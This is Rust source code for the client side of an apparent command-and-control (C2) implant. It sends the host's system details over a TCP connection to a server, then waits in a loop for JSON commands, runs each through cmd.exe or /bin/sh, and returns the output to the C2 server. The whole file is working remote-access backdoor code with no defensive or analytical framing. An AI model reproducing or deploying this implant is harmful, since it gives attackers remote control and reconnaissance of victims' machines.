use std::io::{self, BufRead, BufReader, Write};
use std::net::TcpStream;
use std::process::Command;
use std::{thread, time};


use crate::config::{Config, C2Command};


/// Executes a given command on the client system.
///
/// This function spawns a shell process to execute the provided command and
/// captures its output.
/// If the command execution is successful, it returns the stdout as `Ok`.
/// If the command fails, it returns the stderr as `Err`.
///
/// # Parameters
///
/// * `cmd`: A string slice that holds the command to be executed.
///
/// # Returns
///
/// A `Result` containing either the command output (stdout) as `Ok(String)`,
/// or an error message (stderr) as `Err(String)` if the command execution fails.
pub fn execute_command(cmd: &String) -> Result<String, String> {


    let output = if cfg!(windows) {
        match Command::new("C:\\Windows\\System32\\cmd.exe").arg("/c").arg(cmd).output() {
            Ok(output) => {
                if output.status.success() {
                    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
                } else {
                    Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
                }
            },
            Err(e) => {
                Err(e.to_string())
            }
        }

    } else {
        match Command::new("/bin/sh").arg("-c").arg(cmd).output() {
            Ok(output) => {
                if output.status.success() {
                    Ok(String::from_utf8_lossy(&output.stdout).trim().to_string())
                } else {
                    Err(String::from_utf8_lossy(&output.stderr).trim().to_string())
                }
            },
            Err(e) => {
                Err(e.to_string())
            }
        }
    };

    output

}

/// Sends system information to the server.
///
/// Serializes the client's system configuration into JSON format and sends it
/// over the provided TCP stream.
/// This information includes details such as the CPU architecture, operating
/// system, and network interfaces.
///
/// # Parameters
///
/// * `stream`: A mutable reference to a TCPStream connected to the server.
pub fn send_sys_info(stream: &mut TcpStream) {
    let config = Config::new();
    let config_json = config.to_json().expect("Failed to serialize Config") + "\n";

    stream.write_all(config_json.as_bytes()).unwrap();
    stream.flush().unwrap();
}

/// Listens for instructions from the server and executes them.
///
/// Continuously reads from the TCP stream for new commands, deserializes them,
/// executes the command, and sends the output back to the server. This
/// function maintains a loop to listen for instructions indefinitely until the
/// connection is lost.
///
/// # Parameters
///
/// * `stream`: A mutable reference to a TCPStream connected to the server.
///
/// # Returns
///
/// An `io::Result<()>` indicating the success or failure of the operation.
pub fn listening_for_instructions(stream: &mut TcpStream) -> io::Result<()> {


    // send host info
    send_sys_info(stream);


    let mut buffer: Vec<u8> = Vec::new();
    let mut reader = BufReader::new(stream.try_clone()?);

    loop {

        buffer.clear();
        match reader.read_until(b'\n', &mut buffer) {
            Ok(bytes_read) => {
                if bytes_read == 0 {
                    println!("Connection lost!!");
                    break;
                }

                let command_str = String::from_utf8_lossy(&buffer);

                match  serde_json::from_str::<C2Command>(&command_str) {
                    Ok(command) => {
                        println!("[I] Received command: {}", command.name);

                        match execute_command(&command.name) {
                            Ok(output) => {
                                let response = C2Command {
                                    name: command.name.clone(),
                                    output: Some(output),
                                };
                                let response_json = serde_json::to_string(&response)
                                    .expect("Failed to serialize command response") + "\n";
                                println!("[I] {} output sent to C2", command.name);
                                stream.write_all(response_json.as_bytes())?;
                                stream.flush()?;
                            },
                            Err(e) => {
                                println!("[E] Error executing command: {}", e);
                            }
                        }
                    },
                    Err(e) => {
                        println!("[E] Failed to deserialize command: {}", e);
                    }
                }

            },
            Err(e) => {
                println!("[E] Error reading from stream: {}", e);
            }
        }


        // Sleep a bit
        thread::sleep(time::Duration::from_secs(3));

    }

    Ok(())
}


